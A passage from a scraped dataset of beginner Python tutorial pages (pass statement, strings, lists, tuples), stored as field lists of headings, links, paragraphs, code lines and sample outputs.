'Current element: 1 Current element: 2 Current element: 3 \nWe are inside pass block\n\n\nCame out of pass\n\nCurrent element: 4 Current element: 5']",[],[]
18,['Python Pass'],"[""In Python, the pass keyword is used to execute nothing; it means, when we don't want to execute code, the pass can be used to execute empty. It is the same as the name refers to. It just makes the control to pass by without executing any code. If we want to bypass any code pass statement can be used.""]","['https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/python-continue', 'https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/python-continue', 'https://www.javatpoint.com/python-strings']",[],[],[],[],[],"['Suppose we have a loop, and we do not want to execute right this moment, but we will execute in the future. Here we can use the pass.', 'Consider the following example.', 'Example - Pass statement', 'Example - 2:', 'We can create empty class or function using the pass statement.']",[],"[""It is beneficial when a statement is required syntactically, but we want we don't want to execute or execute it later. The difference between the comments and pass is that, comments are entirely ignored by the Python interpreter, where the pass statement is not ignored.""]","['# pass is just a placeholder for', '# we will adde functionality later.', ""values = {'P', 'y', 't', 'h','o','n'}"", 'for val in values:', 'pass', 'for i in [1,2,3,4,5]:', 'if(i==4):', 'pass', 'print(""This is pass block"",i)', 'print(i)', 'This is pass block 4', '# Empty Function', 'def function_name(args):', 'pass', '#Empty Class', 'class Python:', 'pass']",[],[],[]
19,['Python String'],"['Till now, we have discussed numbers as the standard data-types in Python. In this section of the tutorial, we will discuss the most popular data type in Python, i.e., string.']","['https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/python-numbers', 'https://www.javatpoint.com/python-string-capitalize-method', 'https://www.javatpoint.com/python-string-casefold-method', 'https://www.javatpoint.com/python-string-center-method', 'https://www.javatpoint.com/python-string-count-method', 'https://www.javatpoint.com/python-string-encode-method', 'https://www.javatpoint.com/python-string-endswith-method', 'https://www.javatpoint.com/python-string-expandtabs-method', 'https://www.javatpoint.com/python-string-find-method', 'https://www.javatpoint.com/python-string-format-method', 'https://www.javatpoint.com/python-string-index-method', 'https://www.javatpoint.com/python-string-isalnum-method', 'https://www.javatpoint.com/python-string-isalpha-method', 'https://www.javatpoint.com/python-string-isdecimal-method', 'https://www.javatpoint.com/python-string-isdigit-method', 'https://www.javatpoint.com/python-string-isidentifier-method', 'https://www.javatpoint.com/None', 'https://www.javatpoint.com/python-string-islower-method', 'https://www.javatpoint.com/python-string-isnumeric-method', 'https://www.javatpoint.com/python-string-isprintable-method', 'https://www.javatpoint.com/python-string-isupper-method', 'https://www.javatpoint.com/python-string-isspace-method', 'https://www.javatpoint.com/python-string-istitle-method', 'https://www.javatpoint.com/python-string-isupper-method', 'https://www.javatpoint.com/python-string-join-method', 'https://www.javatpoint.com/python-string-ljust-method', 'https://www.javatpoint.com/python-string-lower-method', 'https://www.javatpoint.com/python-string-lstrip-method', 'https://www.javatpoint.com/python-string-partition-method', 'https://www.javatpoint.com/python-string-replace-method', 'https://www.javatpoint.com/python-string-rfind-method', 'https://www.javatpoint.com/python-string-rindex-method', 'https://www.javatpoint.com/python-string-rjust-method', 'https://www.javatpoint.com/python-string-rstrip-method', 'https://www.javatpoint.com/python-string-rsplit-method', 'https://www.javatpoint.com/python-string-split-method', 'https://www.javatpoint.com/python-string-splitlines-method', 'https://www.javatpoint.com/python-string-startswith-method', 'https://www.javatpoint.com/python-string-swapcase-method', 'https://www.javatpoint.com/python-string-translate-method', 'https://www.javatpoint.com/python-string-upper-method', 'https://www.javatpoint.com/python-string-zfill-method', 'https://www.javatpoint.com/python-string-rpartition-method', 'https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/python-numbers', 'https://www.javatpoint.com/python-lists']","['https://static.javatpoint.com/python/images/strings-indexing-and-splitting.png', 'https://static.javatpoint.com/python/images/strings-indexing-and-splitting2.png', 'https://static.javatpoint.com/python/images/strings-indexing-and-splitting3.png']",[],"['Creating String in Python', 'Strings indexing and splitting', 'Reassigning Strings', 'Deleting the String', 'String Operators', 'Python String Formatting', 'The format() method', 'Python String Formatting Using % Operator', 'Python String functions']","['Syntax:', 'Example 1', 'Example 2', 'Example', 'Escape Sequence', 'Example -']",[],"['Each character is encoded in the ASCII or Unicode character. So we can say that Python strings are also called the collection of Unicode characters.', 'Consider the following example in Python to create a string.', 'Here, if we check the type of the variable str using a Python script', 'Like other languages, the indexing of the Python strings starts from 0. For example, The string ""HELLO"" is indexed as given in the below figure.', 'Consider the following example:', 'Consider the following example:', 'Consider the following example', 'Consider the following example.', 'However, in example 1, the string str can be assigned completely to a new content as specified in the following example.', 'Now we are deleting entire string.', 'Consider the following example to understand the real use of Python operators.', 'Consider the following example to understand the real use of Python operators. ', 'We can use the triple quotes to accomplish this problem but Python provides the escape sequence.', 'The list of an escape sequence is given below:', 'Here is the simple example of escape sequence.', 'Consider the following example.', 'Python provides various in-built functions that are used for string handling. Many String fun']","[""Python string is the collection of the characters surrounded by single quotes, double quotes, or triple quotes. The computer does not understand the characters; internally, it stores manipulated character as the combination of the 0's and 1's."", 'In Python, strings can be created by enclosing the character or the sequence of characters in the quotes. Python allows us to use single quotes, double quotes, or triple quotes to create the string.', ""In Python, strings are treated as the sequence of characters, which means that Python doesn't support the character data-type; instead, a single character written as 'p' is treated as the string of length 1."", 'We can create a string by enclosing the characters in single-quotes or double- quotes. Python also provides triple-quotes to represent the string, but it is generally used for multiline string or docstrings.', 'As shown in Python, the slice operator [] is used to access the individual characters of the string. However, we can use the : (colon) operator in Python to access the substring from the given string. Consider the following example.', ""Here, we must notice that the upper range given in the slice operator is always exclusive i.e., if str = 'HELLO' is given, then str[1:3] will always include str[1] = 'E', str[2] = 'L' and nothing else."", 'We can do the negative slicing in the string; it starts from the rightmost character, which is indicated as -1. The second rightmost index indicates -2, and so on. Consider the following image.', 'As we know that strings are immutable. We cannot delete or remove the characters from the string.\xa0 But we can delete the entire string using the del keyword.', 'Let\'s suppose we need to write the text as - They said, ""Hello what\'s going on?""- the given statement can be written in single quotes or double quotes but it will raise the SyntaxError as it contains both single and double-quotes.', 'The backslash(/) symbol denotes the escape sequence. The backslash can be followed by a special character and it interpreted differently. The single quotes inside the string must be escaped. We can apply the same as in the double quotes.', 'We can ignore the escape sequence from the given string by using the raw string. We can do this by writing r or R in front of the string. Consider the following example.', ""The format() method is the most flexible and useful method in formatting strings. The curly braces {} are used as the placeholder in the string and replaced by the format() method argument. Let's have a look at the given an example:""]","[""Updating the content of the strings is as easy as assigning it to a new string. The string object doesn't support item assignment i.e., A string can only be replaced with new string since its content cannot be partially replaced. Strings are immutable in Python."", ""Python allows us to use the format specifiers used in C's printf statement. The format specifiers in Python are treated in the same way as they are treated in C. However, Python provides an additional operator %, which is used as an interface between the format specifiers and their values. In other words, we can say that it binds the format specifiers to the values.""]","['str = ""Hi Python !""', 'print(type(str)), then it will print a string (str).', '#Using single quotes', ""str1 = 'Hello Python'"", 'print(str1)', '#Using double quotes', 'str2 = ""Hello Python""', 'print(str2)', '#Using triple quotes', ""str3 = '''Triple quotes are generally used for"", 'represent the multiline or', ""docstring'''"", 'print(str3)', 'str = ""HELLO""', 'print(str[0])', 'print(str[1])', 'print(str[2])', 'print(str[3])', 'print(str[4])', ""# It returns the IndexError because 6th index doesn't exist"", 'print(str[6])', '# Given String', 'str = ""JAVATPOINT""', '# Start Oth index to end', 'print(str[0:])', '# Starts 1th index to 4th index', 'print(str[1:5])', '# Starts 2nd index to 3rd index', 'print(str[2:4])', '# Starts 0th to 2nd index', 'print(str[:3])', '#Starts 4th to 6th index', 'print(str[4:7])', ""str = 'JAVATPOINT'"", 'print(str[-1])', 'print(str[-3])', 'print(str[-2:])', 'print(str[-4:-1])', 'print(str[-7:-2])', '# Reversing the given string', 'print(str[::-1])', 'print(str[-12])', 'str = ""HELLO""', 'str[0] = ""h""', 'print(str)', 'str = ""HELLO""', 'print(str)', 'str = ""hello""', 'print(str)', 'str = ""JAVATPOINT""', 'del str[1]', 'str1 = ""JAVATPOINT""', 'del str1', 'print(str1)', 'str = ""Hello""', 'str1 = "" world""', 'print(str*3) # prints HelloHelloHello', 'print(str+str1)# prints Hello world', 'print(str[4]) # prints o', 'print(str[2:4]); # prints ll', ""print('w' in str) # prints false as w is not present in str"", ""print('wo' not in str1) # prints false as wo is present in str1."", ""print(r'C://python37') # prints C://python37 as it is written"", 'print(""The string str : %s""%(str)) # prints The string str : Hello', 'str = ""They said, ""Hello what\'s going on?""""', 'print(str)', '# using triple quotes', 'print(\'\'\'They said, ""What\'s there?""\'\'\')', '# escaping single quotes', 'print(\'They said, ""What\\\'s going on?""\')', '# escaping double quotes', 'print(""They said, \\""What\'s going on?\\"""")', 'print(""C:\\\\Users\\\\DEVANSH SHARMA\\\\Python32\\\\Lib"")', 'print(""This is the \\n multiline quotes"")', 'print(""This is \\x48\\x45\\x58 representation"")', 'print(r""C:\\\\Users\\\\DEVANSH SHARMA\\\\Python32"")', '# Using Curly braces', 'print(""{} and {} both are the best friend"".format(""Devansh"",""Abhishek""))', '#Positional Argument', 'print(""{1} and {0} best players "".format(""Virat"",""Rohit""))', '#Keyword Argument', 'print(""{a},{b},{c}"".format(a = ""James"", b = ""Peter"", c = ""Ricky""))', 'Integer = 10;', 'Float = 1.290', 'String = ""Devansh""', 'print(""Hi I am Integer ... My value is %d\\nHi I am float ... My value is %f\\nHi I am string ... My value is %s""%(Integer,Float,String))']","['Hello Python', 'Hello Python', 'Triple quotes are generally used for', 'represent the multiline or', 'docstring', 'H', 'E', 'L', 'L', 'O', 'IndexError: string index out of range', 'JAVATPOINT', 'AVAT', 'VA', 'JAV', 'TPO', 'T', 'I', 'NT', 'OIN', 'ATPOI', 'TNIOPTAVAJ', 'IndexError: string index out of range', 'Traceback (most recent call last):', 'File ""12.py"", line 2, in <module>', 'str[0] = ""h"";', ""TypeError: 'str' object does not support item assignment"", 'HELLO', 'hello', ""TypeError: 'str' object doesn't support item deletion"", ""NameError: name 'str1' is not defined"", 'HelloHelloHello', 'Hello world', 'o', 'll', 'False', 'False', 'C://python37', 'The string str : Hello', 'SyntaxError: invalid syntax', 'They said, ""What\'s there?""', 'They said, ""What\'s going on?""', 'They said, ""What\'s going on?""', 'print(""Python1 \\', 'Python2 \\', 'Python3"")', 'Python1 Python2 Python3', 'print(""\\\\"")', '\\', ""print('\\'')"", ""'"", 'print(""\\"""")', '""', 'print(""\\a"")', 'print(""Hello \\b World"")', 'Hello World', 'print(""Hello \\f World!"")', 'Hello  World!', 'print(""Hello \\n World!"")', 'Hello', 'World!', 'print(""Hello \\r World!"")', 'World!', 'print(""Hello \\t World!"")', 'Hello \t World!', 'print(""Hello \\v World!"")', 'Hello', 'World!', 'print(""\\110\\145\\154\\154\\157"")Output:', 'Hello', 'Output:', 'Hello', 'Hello', 'print(""\\x48\\x65\\x6c\\x6c\\x6f"")', 'Hello', 'C:\\Users\\DEVANSH SHARMA\\Python32\\Lib', 'This is the', 'multiline quotes', 'This is HEX representation', 'C:\\\\Users\\\\DEVANSH SHARMA\\\\Python32', 'Devansh and Abhishek both are the best friend', 'Rohit and Virat best players', 'James,Peter,Ricky', 'Hi I am Integer ... My value is 10', 'Hi I am float ... My value is 1.290000', 'Hi I am string ... My value is Devansh']","['Operator|||Description&&&+|||It is known as concatenation operator used to join the strings given either side of the operator. &&&*|||It is known as repetition operator. It concatenates the multiple copies of the same string. &&&[]|||It is known as slice operator. It is used to access the sub-strings of a particular string. &&&[:]|||It is known as range slice operator. It is used to access the characters from the specified range. &&&in|||It is known as membership operator. It returns if a particular sub-string is present in the specified string. &&&not in |||It is also a membership operator and does the exact reverse of in. It returns true if a particular substring is not present in the specified string. &&&r/R|||It is used to specify the raw string. Raw strings are used in the cases where we need to print the actual meaning of escape characters such as ""C://python"". To define any string as a raw string, the character r or R is followed by the string. &&&%|||It is used to perform string formatting. It makes use of the format specifiers used in C programming like %d or %f to map their values in python. We will discuss how formatting is done in python. ', 'Sr.|||Escape Sequence|||Description|||Example&&&1.|||\\newline|||It ignores the new line.|||print(""Python1 \\\r|||Python2 \\\r|||Python3"")|||Output:|||Python1 Python2 Python3&&&2.|||\\\\|||Backslash|||print(""\\\\"")|||Output:|||\\&&&3.|||\\\'|||Single Quotes|||print(\'\\\'\')|||Output:|||\'&&&4.|||\\\\\'\'|||Double Quotes|||print(""\\"""")|||Output:|||""&&&5.|||\\a|||ASCII Bell|||print(""\\a"")&&&6.|||\\b|||ASCII Backspace(BS)|||print(""Hello \\b World"")|||Output:|||Hello World&&&7.|||\\f|||ASCII Formfeed|||print(""Hello \\f World!"")\r|||Hello  World!&&&8.|||\\n|||ASCII Linefeed|||print(""Hello \\n World!"")|||Output:|||Hello\r||| World!&&&9.|||\\r|||ASCII Carriege Return(CR)|||print(""Hello \\r World!"")|||Output:|||World!&&&10.|||\\t|||ASCII Horizontal Tab|||print(""Hello \\t World!"")|||Output:|||Hello \t World!&&&11.|||\\v|||ASCII Vertical Tab|||print(""Hello \\v World!"")|||Output:|||Hello \r||| World!&&&12.|||\\ooo|||Character with octal value|||print(""\\110\\145\\154\\154\\157"")Output:\r|||Hello&&&13|||\\xHH|||Character with hex value.|||print(""\\x48\\x65\\x6c\\x6c\\x6f"")|||Output:|||Hello', ""Method |||Description&&&capitalize()|||It capitalizes the first character of the String. This function is deprecated in python3&&&casefold()|||It returns a version of s suitable for case-less comparisons. &&&center(width ,fillchar)|||It returns a space padded string with the original string centred with equal number of left and right spaces. &&&count(string,begin,end)|||It counts the number of occurrences of a substring in a String between begin and end index.&&&decode(encoding = 'UTF8', errors = 'strict')|||Decodes the string using codec registered for encoding. &&&encode()|||Encode S using the codec registered for encoding. Default encoding is 'utf-8'. &&&endswith(suffix ,begin=0,end=len(string))|||It returns a Boolean value if the string terminates with given suffix between begin and end.&&&expandtabs(tabsize = 8)|||It defines tabs in string to multiple spaces. The default space value is 8.&&&find(substring ,beginIndex, endIndex)|||It returns the index value of the string where substring is found between begin index and end index.&&&format(value)|||It returns a formatted version of S, using the passed value. &&&index(subsring, beginIndex, endIndex)|||It throws an exception if string is not found. It works same as find() method.&&&isalnum()|||It returns true if the characters in the string are alphanumeric i.e., alphabets or numbers and there is at least 1 character. Otherwise, it returns false.&&&isalpha()|||It returns true if all the characters are alphabets and there is at least one character, otherwise False.&&&isdecimal()|||It returns true if all the characters of the string are decimals. &&&isdigit()|||It returns true if all the characters are digits and there is at least one character, otherwise False.&&&isidentifier()|||It returns true if the string is the valid identifier. &&&islower()|||It returns true if the characters of a string are in lower case, otherwise false.&&&isnumeric()|||It returns true if the string contains only numeric characters. &&&isprintable()|||It returns true if all the characters of s are printable or s is empty, false otherwise. &&&isupper()|||It returns false if characters of a string are in Upper case, otherwise False.&&&isspace()|||It returns true if the characters of a string are white-space, otherwise false.&&&istitle()|||It returns true if the string is titled properly and false otherwise. A title string is the one in which the first character is upper-case whereas the other characters are lower-case. &&&isupper()|||It returns true if all the characters of the string(if exists) is true otherwise it returns false. &&&join(seq)|||It merges the strings representation of the given sequence. &&&len(string)|||It returns the length of a string.&&&ljust(width[,fillchar])|||It returns the space padded strings with the original string left justified to the given width. &&&lower()|||It converts all the characters of a string to Lower case.&&&lstrip()|||It removes all leading whitespaces of a string and can also be used to remove particular character from leading.&&&partition()|||It searches for the separator sep in S, and returns the part before it, the separator itself, and the part after it.  If the separator is not found, return S and two empty strings.&&&maketrans()|||It returns a translation table to be used in translate function. &&&replace(old,new[,count]) |||It replaces the old sequence of characters with the new sequence. The max characters are replaced if max is given. &&&rfind(str,beg=0,end=len(str))|||It is similar to find but it traverses the string in backward direction. &&&rindex(str,beg=0,end=len(str)) |||It is same as index but it traverses the string in backward direction. &&&rjust(width,[,fillchar])|||Returns a space padded string having original string right justified to the number of characters specified. &&&rstrip()|||It removes all trailing whitespace of a string and can also be used to remove particular character from trailing.&&&rsplit(sep=None, maxsplit = -1)|||It is same as split() but it processes the string from the backward direction. It returns the list of words in the string. If Separator is not specified then the string splits according to the white-space. &&&split(str,num=string.count(str)) |||Splits the string according to the delimiter str. The string splits according to the space if the delimiter is not provided. It returns the list of substring concatenated with the delimiter.    &&&splitlines(num=string.count('\\n'))|||It returns the list of strings at each line with newline removed. &&&startswith(str,beg=0,end=len(str)) |||It returns a Boolean value if the string starts with given str between begin and end. &&&strip([chars]) |||It is used to perform lstrip() and rstrip() on the string. &&&swapcase()|||It inverts case of all characters in a string.&&&title() |||It is used to convert the string into the title-case i.e., The string meEruT will be converted to Meerut.  &&&translate(table,deletechars = '')|||It translates the string according to the translation table passed in the function . &&&upper()|||It converts all the characters of a string to Upper Case.&&&zfill(width)|||Returns original string leftpadded with zeros to a total of width characters; intended for numbers, zfill() retains any sign given (less one zero).&&&rpartition()|||""]",[]
20,['Python List'],"['A list in Python is used to store the sequence of various types of data. Python lists are mutable type its mean we can modify its element after it created. However, Python consists of six data-types that are capable to store the sequences, but the most common and reliable type is the list.']","['https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/python-tuples']","['https://static.javatpoint.com/python/images/lists-indexing-and-splitting.png', 'https://static.javatpoint.com/python/images/lists-indexing-and-splitting2.png']",[],"['List indexing and splitting', 'Updating List values', 'Python List Operations', 'Iterating a List', 'Adding elements to the list', 'Removing elements from the list', 'Python List Built-in functions']",['Characteristics of Lists'],[],"['A list can be define as below', 'IIf we try to print the type of L1, L2, and L3 using type() function then it will come out to be a list.', 'The list has the following characteristics:', ""Let's check the first statement that lists are the ordered."", ""Lists maintain the order of the element for the lifetime. That's why it is the ordered collection of objects."", ""Let's have a look at the list example in detail."", 'The indexing is processed in the same way as it happens with the strings. The elements of the list can be accessed by using the slice operator [].', 'We can get the sub-list of the list using the following syntax.', 'Consider the following example:', ""Let's have a look at the following example where we will use negative indexing to access the elements of the list."", 'Python also provides append() and insert() methods, which can be used to add values to the list.', 'Consider the following example to update the values inside the list.', 'Consider the following example to delete the list elements.', 'The concatenation (+) and repetition (*) operators work in the same way as they were working with the strings.', ""Let's see how the list responds to various operators."", 'A list can be iterated by using a for - in loop. A simple list containing four strings, which can be iterated as follows.', 'Consider the following example in which, we are taking the elements of the list from the user and printing the list on the console.', 'Python provides the remove() function which is used to remove the element from the list. Consider the following example to understand this concept.', 'Python provides the following built-in functions, which can be used with the lists.', ""Let's have a look at the few list examples."", 'Example: 1- Write the program to remove the duplicate element of the list.', 'Example:2- Write a program to find the sum of the element in the list.', 'Example: 3- Write the program to find the lists consist of at least one common element.']","['A list can be defined as a collection of values or items of different types. The items in the list are separated with the comma (,) and enclosed with the square brackets [].', 'Both lists have consisted of the same elements, but the second list changed the index position of the 5th element that violates the order of lists. When compare both lists it returns the false.', 'In the above example, we have created the lists which consist of the employee and department details and printed the corresponding details. Observe the above code to understand the concept of the list better.', 'The index starts from 0 and goes to length - 1. The first element of the list is stored at the 0th index, the second element of the list is stored at the 1st index, and so on.', 'As we discussed above, we can get an element by using negative indexing. In the above code, the first print statement returned the rightmost element of the list. The second print statement returned the sub-list, and so on. ', 'Lists are the most versatile data structures in Python since they are mutable, and their values can be updated by using the slice and assignment operator.', 'The list elements can also be deleted by using the del keyword. Python also provides us the remove() method if we do not know which element is to be deleted from the list.', 'Python provides append() function which is used to add an element to the list. However, the append() function can only add value to the end of the list.']","['Unlike other languages, Python provides the flexibility to use the negative indexing also. The negative indices are counted from the right. The last element (rightmost) of the list has the index -1; its adjacent left element is present at the index -2 and so on until the left-most elements are encountered.']","['L1 = [""John"", 102, ""USA""]', 'L2 = [1, 2, 3, 4, 5, 6]', 'print(type(L1))', 'print(type(L2))', 'a = [1,2,""Peter"",4.50,""Ricky"",5,6]', 'b = [1,2,5,""Peter"",4.50,""Ricky"",6]', 'a = [1, 2,""Peter"", 4.50,""Ricky"",5, 6]', 'b = [1, 2,""Peter"", 4.50,""Ricky"",5, 6]', 'emp = [""John"", 102, ""USA""]', 'Dep1 = [""CS"",10]', 'Dep2 = [""IT"",11]', 'HOD_CS = [10,""Mr. Holding""]', 'HOD_IT = [11, ""Mr. Bewon""]', 'print(""printing employee data..."")', 'print(""Name : %s, ID: %d, Country: %s""%(emp[0],emp[1],emp[2]))', 'print(""printing departments..."")', 'print(""Department 1:\\nName: %s, ID: %d\\nDepartment 2:\\nName: %s, ID: %s""%(Dep1[0],Dep2[1],Dep2[0],Dep2[1]))', 'print(""HOD Details ...."")', 'print(""CS HOD Name: %s, Id: %d""%(HOD_CS[1],HOD_CS[0]))', 'print(""IT HOD Name: %s, Id: %d""%(HOD_IT[1],HOD_IT[0]))', 'print(type(emp),type(Dep1),type(Dep2),type(HOD_CS),type(HOD_IT))', 'list_varible(start:stop:step)', 'list = [1,2,3,4,5,6,7]', 'print(list[0])', 'print(list[1])', 'print(list[2])', 'print(list[3])', '# Slicing the elements', 'print(list[0:6])', '# By default the index value is 0 so its starts from the 0th element and go for index -1.', 'print(list[:])', 'print(list[2:5])', 'print(list[1:6:2])', 'list = [1,2,3,4,5]', 'print(list[-1])', 'print(list[-3:])', 'print(list[:-1])', 'print(list[-3:-1])', 'list = [1, 2, 3, 4, 5, 6]', 'print(list)', '# It will assign value to the value to the second index', 'list[2] = 10', 'print(list)', '# Adding multiple-element', 'list[1:3] = [89, 78]', 'print(list)', '# It will add value at the end of the list', 'list[-1] = 25', 'print(list)', 'list = [1, 2, 3, 4, 5, 6]', 'print(list)', '# It will assign value to the value to second index', 'list[2] = 10', 'print(list)', '# Adding multiple element', 'list[1:3] = [89, 78]', 'print(list)', '# It will add value at the end of the list', 'list[-1] = 25', 'print(list)', 'Consider a Lists l1 = [1, 2, 3, 4], and l2 = [5, 6, 7, 8] to perform operation.', 'list = [""John"", ""David"", ""James"", ""Jonathan""]', 'for i in list:', '# The i variable will iterate over the elements of the List and contains each element in each iteration.', 'print(i)', '#Declaring the empty list', '#Number of elements will be entered by the user', 'n = int(input(""Enter the number of elements in the list:""))', '# for loop to take the input', 'for i in range(0,n):', '# The input is taken from the user and added to the list as the item', 'l.append(input(""Enter the item:""))', 'print(""printing the list items.."")', '# traversal loop to print the list items', 'for i in l:', 'print(i, end = ""  "")', 'list = [0,1,2,3,4]', 'print(""printing original list: "");', 'for i in list:', 'print(i,end="" "")', 'list.remove(2)', 'print(""\\nprinting the list after the removal of first element..."")', 'for i in list:', 'print(i,end="" "")', 'list1 = [1,2,2,3,55,98,65,65,13,29]', '# Declare an empty list that will store unique values', 'list2 = []', 'for i in list1:', 'if i not in list2:', 'list2.append(i)', 'print(list2)', 'list1 = [3,4,5,9,10,12,24]', 'sum = 0', 'for i in list1:', 'sum = sum+i', 'print(""The sum is:"",sum)', 'list1 = [1,2,3,4,5,6]', 'list2 = [7,8,9,2,10]', 'for x in list1:', 'for y in list2:', 'if x == y:', 'print(""The common element is:"",x)']","[""<class 'list'>"", ""<class 'list'>"", 'False', 'True', 'printing employee data...', 'Name : John, ID: 102, Country: USA', 'printing departments...', 'Department 1:', 'Name: CS, ID: 11', 'Department 2:', 'Name: IT, ID: 11', 'HOD Details ....', 'CS HOD Name: Mr. Holding, Id: 10', 'IT HOD Name: Mr. Bewon, Id: 11', ""<class 'list'> <class 'list'> <class 'list'> <class 'list'> <class 'list'>"", '1', '2', '3', '4', '[1, 2, 3, 4, 5, 6]', '[1, 2, 3, 4, 5, 6, 7]', '[3, 4, 5]', '[2, 4, 6]', '5', '[3, 4, 5]', '[1, 2, 3, 4]', '[3, 4]', '[1, 2, 3, 4, 5, 6]', '[1, 2, 10, 4, 5, 6]', '[1, 89, 78, 4, 5, 6]', '[1, 89, 78, 4, 5, 25]', '[1, 2, 3, 4, 5, 6]', '[1, 2, 10, 4, 5, 6]', '[1, 89, 78, 4, 5, 6]', '[1, 89, 78, 4, 5, 25]', 'L1*2 = [1, 2, 3, 4, 1, 2, 3, 4]', 'l1+l2 = [1, 2, 3, 4, 5, 6, 7, 8]', 'print(2 in l1) prints True.', 'for i in l1:', 'print(i)', '1', '2', '3', '4', 'len(l1) = 4', 'John', 'David', 'James', 'Jonathan', 'Enter the number of elements in the list:5', 'Enter the item:25', 'Enter the item:46', 'Enter the item:12', 'Enter the item:75', 'Enter the item:42', 'printing the list items', '25  46  12  75  42', 'printing original list:', '0 1 2 3 4', 'printing the list after the removal of first element...', '0 1 3 4', 'L1 = [1,2,3,4,5,6,7,8]', 'print(len(L1))', '8', 'L1 = [12,34,26,48,72]', 'print(max(L1))', '72', 'L1 = [12,34,26,48,72]', 'print(min(L1))', '12', 'str = ""Johnson""', 's = list(str)', 'print(type(s))', '<class list>', '[1, 2, 3, 55, 98, 65, 13, 29]', 'The sum is: 67', 'The common element is: 2']","['Operator|||Description|||Example&&&Repetition |||The repetition operator enables the list elements to be repeated multiple times.|||L1*2 = [1, 2, 3, 4, 1, 2, 3, 4]&&&Concatenation |||It concatenates the list mentioned on either side of the operator.|||l1+l2 = [1, 2, 3, 4, 5, 6, 7, 8]&&&Membership|||It returns true if a particular item exists in a particular list otherwise false.|||print(2 in l1) prints True. &&&Iteration |||The for loop is used to iterate over the list elements.|||for i in l1: \r|||    print(i)|||Output1\r|||2\r|||3\r|||4&&&Length|||It is used to get the length of the list|||len(l1) = 4 ', 'SN|||Function |||Description|||Example&&&1|||cmp(list1, list2)|||It compares the elements of both the lists.|||This method is not used in the Python 3 and the above versions.&&&2|||len(list)|||It is used to calculate the length of the list.|||L1 = [1,2,3,4,5,6,7,8]\r|||print(len(L1))\r|||    8&&&3|||max(list)|||It returns the maximum element of the list.|||L1 = [12,34,26,48,72]\r|||print(max(L1))\r|||72&&&4|||min(list)|||It returns the minimum element of the list.|||L1 = [12,34,26,48,72]\r|||print(min(L1))\r|||12&&&5|||list(seq)|||It converts any sequence to the list.|||str = ""Johnson""\r|||s = list(str)\r|||print(type(s))\r|||<class list>']",['|||The lists are ordered.|||The element of the list can access by index.|||The lists are the mutable type.|||The lists are mutable types.|||A list can store the number of various elements.||||||The start denotes the starting index position of the list.|||The stop denotes the last index position of the list.|||The step is used to skip the nth element within a start:stop|||']
21,['Python Tuple'],"['Python Tuple is used to store the sequence of immutable Python objects. The tuple is similar to lists since the value of the items stored in the list can be changed, whereas the tuple is immutable, and the value of the items stored in the tuple cannot be changed.']","['https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/python-set']",['https://static.javatpoint.com/python/images/tuple-indexing-and-splitting.png'],[],"['Creating a tuple', 'Tuple indexing and slicing', 'Negative Indexing', 'Deleting Tuple', 'Basic Tuple operations', 'Python Tuple inbuilt functions', 'Where use tuple?', 'List vs. Tuple']","['Example - 1', 'Example - 2']",['Note: The tuple which is created without using parentheses is also known as tuple packing.'],"['An empty tuple can be created as follows.', 'Creating a tuple with single element is slightly different. We will need to put comma after the element to declare the tuple.', 'A tuple is indexed in the same way as the lists. The items in the tuple can be accessed by using their specific index value.', 'Consider the following example of tuple:', 'A tuple is indexed in the same way as the lists. The items in the tuple can be accessed by using their specific index value.', 'We will see all these aspects of tuple in this section of the tutorial.', 'The indexing and slicing in the tuple are similar to lists. The indexing in the tuple starts from 0 and goes to length(tuple) - 1.', 'Consider the following image to understand the indexing and slicing in detail.', 'Consider the following example:', 'In the above code, the tuple has 7 elements which denote 0 to 6. We tried to access an element outside of tuple that raised an IndexError.', 'The tuple element can also access by using negative indexing. The index of -1 denotes the rightmost element and -2 to the second last item and so on.', 'The elements from left to right are traversed using the negative indexing. Consider the following example:', 'Consider the following example.', ""Let's say Tuple t = (1, 2, 3, 4, 5) and Tuple t1 = (6, 7, 8, 9) are declared."", 'Using tuple instead of list is used in the following scenario.', '1. Using tuple instead of list gives us a clear idea that tuple data is constant and must not be changed.', '2. Tuple can simulate a dictionary without keys. Consider the following nested structure, which can be used as a dictionary.']","['A tuple can be written as the collection of comma-separated (,) values enclosed with the small () brackets. The parentheses are optional but it is good practice to use. A tuple can be defined as follows.', 'The items in the tuple can be accessed by using the index [] operator. Python also allows us to use the colon operator to access multiple items in the tuple.', 'Unlike lists, the tuple items cannot be deleted by using the del keyword as tuples are immutable. To delete an entire tuple, we can use the del keyword with the tuple name.', 'The operators like concatenation (+), repetition (*), Membership (in) works in the same way as they work with the list. Consider the following table for more detail.']",[],"['T1 = (101, ""Peter"", 22)', 'T2 = (""Apple"", ""Banana"", ""Orange"")', 'T3 = 10,20,30,40,50', 'print(type(T1))', 'print(type(T2))', 'print(type(T3))', 'tup1 = (""JavaTpoint"")', 'print(type(tup1))', '#Creating a tuple with single element', 'tup2 = (""JavaTpoint"",)', 'print(type(tup2))', 'tuple1 = (10, 20, 30, 40, 50, 60)', 'print(tuple1)', 'count = 0', 'for i in tuple1:', 'print(""tuple1[%d] = %d""%(count, i))', 'count = count+1', 'tuple1 = tuple(input(""Enter the tuple elements ...""))', 'print(tuple1)', 'count = 0', 'for i in tuple1:', 'print(""tuple1[%d] = %s""%(count, i))', 'count = count+1', 'tup = (1,2,3,4,5,6,7)', 'print(tup[0])', 'print(tup[1])', 'print(tup[2])', '# It will give the IndexError', 'print(tup[8])', 'tuple = (1,2,3,4,5,6,7)', '#element 1 to end', 'print(tuple[1:])', '#element 0 to 3 element', 'print(tuple[:4])', '#element 1 to 4 element', 'print(tuple[1:5])', '# element 0 to 6 and take step of 2', 'print(tuple[0:6:2])', 'tuple1 = (1, 2, 3, 4, 5)', 'print(tuple1[-1])', 'print(tuple1[-4])', 'print(tuple1[-3:-1])', 'print(tuple1[:-1])', 'print(tuple1[-2:])', 'tuple1 = (1, 2, 3, 4, 5, 6)', 'print(tuple1)', 'del tuple1[0]', 'print(tuple1)', 'del tuple1', 'print(tuple1)', '[(101, ""John"", 22), (102, ""Mike"", 28),  (103, ""Dustin"", 30)]']","[""<class 